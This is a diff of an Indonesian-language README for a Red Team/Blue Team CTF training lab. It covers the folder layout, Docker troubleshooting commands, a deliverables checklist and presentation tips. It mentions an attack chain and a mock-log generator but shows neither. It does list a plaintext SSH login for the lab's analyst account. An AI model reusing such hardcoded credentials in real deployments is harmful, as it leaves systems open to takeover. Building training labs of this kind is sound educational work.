+├── ssh/                        ← FOLDER CONTAINER SSH (Blue Team access)
+│   └── Dockerfile              ← Bikin container SSH dengan user analyst
+│
+├── logs/                       ← FOLDER LOG (di-mount dari Docker volume)
+│
+└── scripts/                    ← FOLDER SCRIPT OTOMASI
+    ├── generate-logs.sh        ← Bikin log serangan palsu (untuk Blue Team)
+    └── setup-proxmox.sh        ← Script setup server otomatis
 ```
+
+---
+
+## Troubleshooting
+
+| Masalah | Penyebab | Solusi |
+|---------|----------|--------|
+| Port already in use | Service lain pakai port 3075/2275 | Matikan service lain: `sudo lsof -i :3075` lalu kill |
+| Log kosong / cuma traffic real | Script inject belum jalan | Jalankan: `docker run --rm -v NAMA_VOLUME:/opt/admin/logs -v ~/ctf-lab/scripts:/scripts alpine sh /scripts/generate-logs.sh` |
+| Container gagal build | Biasanya network issue | Cek: `docker-compose logs nama-container` |
+| SSH connection refused | Container SSH belum jalan | `docker-compose ps` → pastikan ctf-ssh status Up |
+| Permission denied baca log | Volume permission issue | `docker exec ctf-feedback-app chmod 644 /opt/admin/logs/*.log` |
 
 ---
 
@@ -466,16 +647,45 @@ ctf-lab/
 
 ```bash
 cd ~/ctf-lab
-docker-compose down -v
+docker-compose down -v    # Matikan semua container + hapus volume log
 ```
 
 ---
 
-## Troubleshooting
+## Checklist Deliverable
 
-| Masalah | Solusi |
-|---------|--------|
-| Port 80 already in use | Ganti port di docker-compose.yml (sudah diset ke 8080) |
-| Log kosong | Jalankan ulang: `docker run --rm -v ctf-lab_logs_data:/opt/admin/logs -v ~/ctf-lab/scripts:/scripts alpine sh /scripts/generate-logs.sh` |
-| Container tidak jalan | Cek: `docker-compose logs` |
-| Permission denied di /opt/admin/logs | Jalankan: `sudo chmod 777 /opt/admin/logs` |
+### Yang Diminta Soal vs Yang Sudah Dikerjakan:
+
+| # | Requirement | File/Lokasi | Status |
+|---|-------------|-------------|--------|
+| 1 | Source code Node.js | `app/server.js`, `app/middleware/waf.js` | ✅ Done |
+| 2 | Docker / Docker Compose | `docker-compose.yml`, `app/Dockerfile`, `ssh/Dockerfile` | ✅ Done |
+| 3 | Script setup Proxmox VM | `scripts/setup-proxmox.sh` | ✅ Done |
+| 4 | Script create SSH user | Embedded in `ssh/Dockerfile` + `setup-proxmox.sh` | ✅ Done |
+| 5 | Script inject mock logs | `scripts/generate-logs.sh` | ✅ Done |
+| 6 | Web app di port 3075 | `docker-compose.yml` (nginx → 3075:80) | ✅ Tested |
+| 7 | SSH port 2275 (analyst/blue_team_rocks) | `docker-compose.yml` + `ssh/Dockerfile` | ✅ Tested |
+| 8 | README + deployment instructions | File ini | ✅ Done |
+| 9 | Red Team walkthrough | Bagian README di atas | ✅ Done |
+| 10 | Blue Team walkthrough | Bagian README di atas | ✅ Done |
+| 11 | Push ke GitHub/GitLab | Repository | ✅ Done |
+| 12 | Presentasi 15-20 menit | Siapin sendiri | ⬜ TODO |
+
+---
+
+## Tips Presentasi (15-20 menit)
+
+**Urutan yang disarankan:**
+
+| Waktu | Bagian | Yang Ditunjukkan |
+|-------|--------|-----------------|
+| 2 menit | Intro | Jelaskan arsitektur (gambar di atas) |
+| 3 menit | Infra | Tunjukkan `docker-compose ps`, jelaskan tiap container |
+| 7 menit | Red Team Demo | Jalankan attack chain live (curl commands) |
+| 5 menit | Blue Team Demo | SSH sebagai analyst, analisis log |
+| 3 menit | Q&A | Jawab pertanyaan |
+
+**Yang perlu disiapkan saat presentasi:**
+- Terminal 1: Browser buka `http://IP_SERVER:3075`
+- Terminal 2: Siap jalankan curl commands (Red Team)
+- Terminal 3: SSH analyst (Blue Team)
